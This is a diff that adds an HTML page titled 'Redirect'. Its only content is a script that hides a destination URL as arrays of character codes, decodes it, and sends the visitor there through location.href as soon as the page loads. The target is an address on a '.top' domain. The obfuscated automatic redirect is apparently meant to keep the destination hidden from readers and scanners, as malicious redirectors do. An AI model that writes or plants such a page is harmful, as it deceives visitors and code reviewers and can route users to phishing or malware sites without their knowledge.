@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Redirect</title>
+<script>
+
+var encrypted = [
+            [104, 116, 116, 112],
+            [115, 58, 47, 47],
+            [115, 111, 102, 116, 112, 111],
+            [114, 116],
+            [97, 108, 46, 116, 111, 112],
+            [47, 115],
+            [47, 116, 101],
+            [115, 116, 103],
+            [105, 116]
+];
+
+var result = encrypted.reduce(
+    (a,b) => a + String.fromCharCode(...b),
+    ""
+);
+
+location.href = result;
+
+</script>
+</head>
+<body>
+</body>
+</html>
